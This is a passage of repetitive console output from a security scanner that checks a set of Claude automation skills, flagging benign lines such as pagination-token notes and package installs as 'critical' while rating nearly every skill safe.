    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-appcircle-automation.json
Scanning: awesome-claude-skills-SE-skills/appveyor-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/appveyor-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/appveyor-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-appveyor-automation.html
Scanning: awesome-claude-skills-SE-skills/appveyor-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/appveyor-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/appveyor-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-appveyor-automation.json
Scanning: awesome-claude-skills-SE-skills/artifacts-builder

[*] Scanning Skill: awesome-claude-skills-SE-skills/artifacts-builder

[OK] Risk Level: SAFE (0.8/10)

[!] CRITICAL Issues (1):
  [CMD001] in awesome-claude-skills-SE-skills/artifacts-builder/scripts/init-artifact.sh:34
    Pattern: if ! command -v pnpm &> /dev/null; then
    Confidence: HIGH

[*] WARNING Issues (2):
  [DEP001] in awesome-claude-skills-SE-skills/artifacts-builder/scripts/init-artifact.sh:36
    Pattern: npm install -g pnpm
    Confidence: MEDIUM
  [DEP001] in awesome-claude-skills-SE-skills/artifacts-builder/scripts/init-artifact.sh:272
    Pattern: pnpm install @radix-ui/react-accordion @radix-ui/react-aspect-ratio @radix-ui...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 1
  Warning Issues: 2
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-artifacts-builder.html
Scanning: awesome-claude-skills-SE-skills/artifacts-builder

[*] Scanning Skill: awesome-claude-skills-SE-skills/artifacts-builder

[OK] Risk Level: SAFE (0.8/10)

[!] CRITICAL Issues (1):
  [CMD001] in awesome-claude-skills-SE-skills/artifacts-builder/scripts/init-artifact.sh:34
    Pattern: if ! command -v pnpm &> /dev/null; then
    Confidence: HIGH

[*] WARNING Issues (2):
  [DEP001] in awesome-claude-skills-SE-skills/artifacts-builder/scripts/init-artifact.sh:36
    Pattern: npm install -g pnpm
    Confidence: MEDIUM
  [DEP001] in awesome-claude-skills-SE-skills/artifacts-builder/scripts/init-artifact.sh:272
    Pattern: pnpm install @radix-ui/react-accordion @radix-ui/react-aspect-ratio @radix-ui...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 1
  Warning Issues: 2
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-artifacts-builder.json
Scanning: awesome-claude-skills-SE-skills/bitbucket-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/bitbucket-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/bitbucket-automation/SKILL.md:76
    Pattern: - `q`: BBQL query filter (e.g., `name~"api"`, `project.key="PROJ"`, `is_priva...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-bitbucket-automation.html
Scanning: awesome-claude-skills-SE-skills/bitbucket-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/bitbucket-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/bitbucket-automation/SKILL.md:76
    Pattern: - `q`: BBQL query filter (e.g., `name~"api"`, `project.key="PROJ"`, `is_priva...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-bitbucket-automation.json
Scanning: awesome-claude-skills-SE-skills/bugbug-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/bugbug-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/bugbug-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-bugbug-automation.html
Scanning: awesome-claude-skills-SE-skills/bugbug-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/bugbug-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/bugbug-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-bugbug-automation.json
Scanning: awesome-claude-skills-SE-skills/bugherd-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/bugherd-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/bugherd-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-bugherd-automation.html
Scanning: awesome-claude-skills-SE-skills/bugherd-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/bugherd-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/bugherd-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-bugherd-automation.json
Scanning: awesome-claude-skills-SE-skills/bugsnag-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/bugsnag-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/bugsnag-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-bugsnag-automation.html
Scanning: awesome-claude-skills-SE-skills/bugsnag-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/bugsnag-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/bugsnag-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-bugsnag-automation.json
Scanning: awesome-claude-skills-SE-skills/buildkite-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/buildkite-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/buildkite-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-buildkite-automation.html
Scanning: awesome-claude-skills-SE-skills/buildkite-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/buildkite-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/buildkite-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-buildkite-automation.json
Scanning: awesome-claude-skills-SE-skills/circleci-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/circleci-automation

[?] Risk Level: LOW (2.2/10)

[!] CRITICAL Issues (5):
  [FILE001] in awesome-claude-skills-SE-skills/circleci-automation/SKILL.md:65
    Pattern: - `page_token`: Pagination cursor for next page of results
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/circleci-automation/SKILL.md:71
    Pattern: - `page_token` is returned in responses for pagination; continue until absent
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/circleci-automation/SKILL.md:147
    Pattern: - Check response for `next_page_token` field
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/circleci-automation/SKILL.md:148
    Pattern: - Pass token as `page_token` in next request
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/circleci-automation/SKILL.md:149
    Pattern: - Continue until `next_page_token` is absent or null
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 5
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 5

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/awesome-claude-skills-SE-skills-circleci-automation.html
Scanning: awesome-claude-skills-SE-skills/circleci-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/circleci-automation

[?] Risk Level: LOW (2.2/10)

[!] CRITICAL Issues (5):
  [FILE001] in awesome-claude-skills-SE-skills/circleci-automation/SKILL.md:65
    Pattern: - `page_token`: Pagination cursor for next page of results
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/circleci-automation/SKILL.md:71
    Pattern: - `page_token` is returned in responses for pagination; continue until absent
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/circleci-automation/SKILL.md:147
    Pattern: - Check response for `next_page_token` field
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/circleci-automation/SKILL.md:148
    Pattern: - Pass token as `page_token` in next request
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/circleci-automation/SKILL.md:149
    Pattern: - Continue until `next_page_token` is absent or null
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 5
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 5

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/awesome-claude-skills-SE-skills-circleci-automation.json
Scanning: awesome-claude-skills-SE-skills/cloudflare-api-key-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/cloudflare-api-key-automation

[?] Risk Level: LOW (3.0/10)

[!] CRITICAL Issues (7):
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:2
    Pattern: name: cloudflare-api-key-automation
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:12
    Pattern: **Toolkit docs**: [composio.dev/toolkits/cloudflare_api_key](https://composio...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:17
    Pattern: - Active Cloudflare API connection via `RUBE_MANAGE_CONNECTIONS` with toolkit...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:25
    Pattern: 2. Call `RUBE_MANAGE_CONNECTIONS` with toolkit `cloudflare_api_key`
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:55
    Pattern: toolkits: ["cloudflare_api_key"]
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:85
    Pattern: | Connect | `RUBE_MANAGE_CONNECTIONS` with toolkit `cloudflare_api_key` |
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 7
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 7

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/awesome-claude-skills-SE-skills-cloudflare-api-key-automation.html
Scanning: awesome-claude-skills-SE-skills/cloudflare-api-key-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/cloudflare-api-key-automation

[?] Risk Level: LOW (3.0/10)

[!] CRITICAL Issues (7):
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:2
    Pattern: name: cloudflare-api-key-automation
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:12
    Pattern: **Toolkit docs**: [composio.dev/toolkits/cloudflare_api_key](https://composio...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:17
    Pattern: - Active Cloudflare API connection via `RUBE_MANAGE_CONNECTIONS` with toolkit...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:25
    Pattern: 2. Call `RUBE_MANAGE_CONNECTIONS` with toolkit `cloudflare_api_key`
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:55
    Pattern: toolkits: ["cloudflare_api_key"]
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-api-key-automation/SKILL.md:85
    Pattern: | Connect | `RUBE_MANAGE_CONNECTIONS` with toolkit `cloudflare_api_key` |
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 7
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 7

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/awesome-claude-skills-SE-skills-cloudflare-api-key-automation.json
Scanning: awesome-claude-skills-SE-skills/cloudflare-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/cloudflare-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-cloudflare-automation.html
Scanning: awesome-claude-skills-SE-skills/cloudflare-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/cloudflare-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-cloudflare-automation.json
Scanning: awesome-claude-skills-SE-skills/cloudflare-browser-rendering-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/cloudflare-browser-rendering-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-browser-rendering-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-cloudflare-browser-rendering-automation.html
Scanning: awesome-claude-skills-SE-skills/cloudflare-browser-rendering-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/cloudflare-browser-rendering-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/cloudflare-browser-rendering-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-cloudflare-browser-rendering-automation.json
Scanning: awesome-claude-skills-SE-skills/codeinterpreter-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/codeinterpreter-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/codeinterpreter-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-codeinterpreter-automation.html
Scanning: awesome-claude-skills-SE-skills/codeinterpreter-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/codeinterpreter-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/codeinterpreter-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-codeinterpreter-automation.json
Scanning: awesome-claude-skills-SE-skills/codereadr-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/codereadr-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/codereadr-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-codereadr-automation.html
Scanning: awesome-claude-skills-SE-skills/codereadr-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/codereadr-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/codereadr-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-codereadr-automation.json
Scanning: awesome-claude-skills-SE-skills/confluence-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/confluence-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-confluence-automation.html
Scanning: awesome-claude-skills-SE-skills/confluence-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/confluence-automation

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-confluence-automation.json
Scanning: awesome-claude-skills-SE-skills/datadog-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/datadog-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/datadog-automation/SKILL.md:71
    Pattern: - Large result sets require pagination; check for cursor/page tokens
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-datadog-automation.html
Scanning: awesome-claude-skills-SE-skills/datadog-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/datadog-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/datadog-automation/SKILL.md:71
    Pattern: - Large result sets require pagination; check for cursor/page tokens
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-datadog-automation.json
Scanning: awesome-claude-skills-SE-skills/digital-ocean-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/digital-ocean-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/digital-ocean-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-digital-ocean-automation.html
Scanning: awesome-claude-skills-SE-skills/digital-ocean-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/digital-ocean-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/digital-ocean-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-digital-ocean-automation.json
Scanning: awesome-claude-skills-SE-skills/discord-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/discord-automation

[?] Risk Level: LOW (2.2/10)

[!] CRITICAL Issues (5):
  [FILE001] in awesome-claude-skills-SE-skills/discord-automation/SKILL.md:105
    Pattern: - `webhook_token`: Webhook secret token
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/discord-automation/SKILL.md:111
    Pattern: - Webhook tokens are secrets; handle securely
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/discord-automation/SKILL.md:159
    Pattern: **Bot vs User Tokens**:
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/discord-automation/SKILL.md:160
    Pattern: - `discordbot` toolkit uses bot tokens; `discord` uses user OAuth
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/discord-automation/SKILL.md:184
    Pattern: | Execute webhook | DISCORDBOT_EXECUTE_WEBHOOK | webhook_id, webhook_token |
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 5
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 5

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/awesome-claude-skills-SE-skills-discord-automation.html
Scanning: awesome-claude-skills-SE-skills/discord-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/discord-automation

[?] Risk Level: LOW (2.2/10)

[!] CRITICAL Issues (5):
  [FILE001] in awesome-claude-skills-SE-skills/discord-automation/SKILL.md:105
    Pattern: - `webhook_token`: Webhook secret token
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/discord-automation/SKILL.md:111
    Pattern: - Webhook tokens are secrets; handle securely
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/discord-automation/SKILL.md:159
    Pattern: **Bot vs User Tokens**:
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/discord-automation/SKILL.md:160
    Pattern: - `discordbot` toolkit uses bot tokens; `discord` uses user OAuth
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/discord-automation/SKILL.md:184
    Pattern: | Execute webhook | DISCORDBOT_EXECUTE_WEBHOOK | webhook_id, webhook_token |
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 5
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 5

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/awesome-claude-skills-SE-skills-discord-automation.json
Scanning: awesome-claude-skills-SE-skills/discordbot-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/discordbot-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/discordbot-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-discordbot-automation.html
Scanning: awesome-claude-skills-SE-skills/discordbot-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/discordbot-automation

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in awesome-claude-skills-SE-skills/discordbot-automation/SKILL.md:78
    Pattern: - **Pagination**: Check responses for pagination tokens and continue fetching...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-discordbot-automation.json
Scanning: awesome-claude-skills-SE-skills/docker_hub-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/docker_hub-automation

[OK] Risk Level: SAFE (0.9/10)

[!] CRITICAL Issues (2):
  [FILE001] in awesome-claude-skills-SE-skills/docker_hub-automation/SKILL.md:83
    Pattern: Many list operations support pagination. Check responses for `next_cursor` or...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/docker_hub-automation/SKILL.md:96
    Pattern: - **Check connection status**: Ensure the Docker Hub connection is ACTIVE bef...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 2
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 2

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-docker_hub-automation.html
Scanning: awesome-claude-skills-SE-skills/docker_hub-automation

[*] Scanning Skill: awesome-claude-skills-SE-skills/docker_hub-automation

[OK] Risk Level: SAFE (0.9/10)

[!] CRITICAL Issues (2):
  [FILE001] in awesome-claude-skills-SE-skills/docker_hub-automation/SKILL.md:83
    Pattern: Many list operations support pagination. Check responses for `next_cursor` or...
    Confidence: MEDIUM
  [FILE001] in awesome-claude-skills-SE-skills/docker_hub-automation/SKILL.md:96
    Pattern: - **Check connection status**: Ensure the Docker Hub connection is ACTIVE bef...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 2
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 2

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/awesome-claude-skills-SE-skills-docker_hub-automation.json
